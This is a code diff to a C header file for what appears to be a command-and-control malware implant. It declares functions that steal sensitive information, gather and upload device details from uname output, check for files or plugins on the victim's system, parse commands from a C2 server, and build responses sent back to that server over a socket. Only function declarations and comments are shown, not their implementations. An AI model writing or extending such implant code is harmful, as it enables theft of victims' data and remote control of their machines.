@@ -78,10 +78,11 @@ void c2_set_timeout(int *sleeptime, int newTime);
 char *c2_steal_sensitive_info();
 
 /**
-* @brief obtain information from /etc/os-release command-id: 0x18320e0
-*
+* @brief obtain information from uname output command-id: 0x18320e0
+* @param cahr *buffer to populate.
+* @return char pointer to string containing system information.
 */
-char *c2_upload_device_info();
+void c2_upload_device_info(char *buffer);
 
 /**
 * @brief check for the existance of a given file/plugin on the file system 0x2CD9070
@@ -145,5 +146,12 @@ char *parse_c2_payload(char *buffer);
  **/
 char *parse_c2_cmdid(char *buffer);
 
+
+/**
+*@brief populate char buffer to send back to C2 server
+*@param char bufffer for "PAYLOAD" section
+*@return N/A
+*/
+void build_c2_response(char *buffer, char cmd_id, int sock);
 
 #endif // C2_COMMANDS_H_
